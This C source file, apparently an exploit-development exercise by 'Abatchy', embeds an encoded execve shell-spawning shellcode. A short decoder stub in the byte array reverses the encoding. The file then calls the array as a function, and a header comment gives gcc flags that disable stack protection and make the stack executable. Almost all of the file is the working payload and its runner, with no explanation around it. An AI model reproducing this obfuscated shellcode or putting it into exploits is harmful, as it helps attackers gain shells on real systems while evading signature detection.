/*
 Rot13ExecveSh.c
By Abatchy
gcc Rot13ExecveSh.c -fno-stack-protector -z execstack -o Rot13ExecveSh.out
*/

#include <stdio.h>
#include <string.h>

unsigned char sc[] = "\xeb\x09\x5e\x80\x2e\x0d\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x3e\xcd\x5d\x96\xef\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\xbd\x18\xda\x8d\x0d";

int main()
{
    printf("Shellcode size: %d\n", strlen(sc));
    int (*ret)() = (int(*)())sc;
    ret();
}
